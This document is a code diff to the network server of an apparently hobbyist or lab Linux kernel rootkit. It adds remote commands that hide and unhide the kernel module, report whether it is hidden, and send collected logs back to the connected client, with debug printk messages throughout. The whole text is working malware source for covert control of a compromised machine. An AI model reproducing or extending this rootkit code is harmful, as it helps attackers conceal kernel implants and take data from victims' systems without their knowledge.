@@ -27,7 +27,7 @@ struct server_t{
 
 struct client_t client;
 struct server_t server;
-
+extern bool module_hidden;
 
 
 static int run_server(void *port){
@@ -92,7 +92,7 @@ static int net_send(void){
 	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
 	int ret;
 	if (client.message==NULL||strlen(client.message)==0){ //if no message to be sent
-		printk("[rootkit][server.c::net_send] ERROR    no message to be sent"); //DEBUG
+		printk("[rootkit][server.c::net_send] ERROR    no message to be sent\n"); //DEBUG
 		return -1;
 	}
 	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
@@ -133,7 +133,7 @@ static int net_recv(void){
 
 	err = kernel_recvmsg(client.sock, &(client.sock_msg), &(client.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0);
 	if (err < 0){
-		printk("[rootkit][server.c::net_send] ERROR    unable to recieve message: err=%d", err); //DEBUG
+		printk("[rootkit][server.c::net_send] ERROR    unable to recieve message: err=%d\n", err); //DEBUG
 		return -1;
 	}
 	return 0;
@@ -142,7 +142,7 @@ static int net_recv(void){
 
 
 static int client_handler(void){
-	printk("[rootkit][server.c::client_handler] DEBUG    client has initiated connection");  //DEBUG
+	printk("[rootkit][server.c::client_handler] DEBUG    client has initiated connection\n");  //DEBUG
 
 	client.message = kzalloc(BUFFER_SIZE, GFP_KERNEL);
 	if (client.message == NULL) {
@@ -163,10 +163,44 @@ static int client_handler(void){
 	while (true){
 		memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
 		net_recv();
+		printk("[rootkit][server.c::client_handler] DEBUG    recieved %s\n", client.message); //DEBUG
 		if (strcmp("logs", client.message)==0){
+			printk("[rootkit][server.c::client_handler] DEBUG    commanf logs running\n"); //DEBUG
 			get_logs(client.message); //cpies logs into message buffer
 			printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");  //DEBUG
 			net_send();
+		}
+		else if (strcmp("hide", client.message)==0){
+			if (module_hidden){
+				strcpy(client.message, "[server.c::client_handler] rootkit already hidden");
+				net_send();
+			}
+			else{
+				hide_rootkit(true);
+				strcpy(client.message, "[server.c::client_handler] rootkit hidden");
+				net_send();
+			}
+		}
+		else if (strcmp("unhide", client.message)==0){
+			if (!module_hidden){
+				strcpy(client.message, "[server.c::client_handler] rootkit already visible");
+				net_send();
+			}
+			else{
+				hide_rootkit(false);
+				strcpy(client.message, "[server.c::client_handler] rootkit visible");
+				net_send();
+			}
+		}
+		else if (strcmp("?hidden", client.message)==0){
+			if (module_hidden){
+				strcpy(client.message, "[server.c::client_handler] the rootkit is hidden");
+				net_send();
+			}
+			else{
+				strcpy(client.message, "[server.c::client_handler] the rootkit is visible");
+				net_send();
+			}
 		}
 	}
 }
